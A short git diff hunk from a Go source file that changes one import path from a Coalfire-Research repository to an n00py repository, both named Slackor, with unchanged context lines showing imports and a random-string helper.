@@ -8,7 +8,7 @@ import (
 	"os/exec"
 	"syscall"
 
-	"github.com/Coalfire-Research/Slackor/pkg/command"
+	"github.com/n00py/Slackor/pkg/command"
 )
 
 func randomString(len int) string { //Creates a random string of uppercase letters
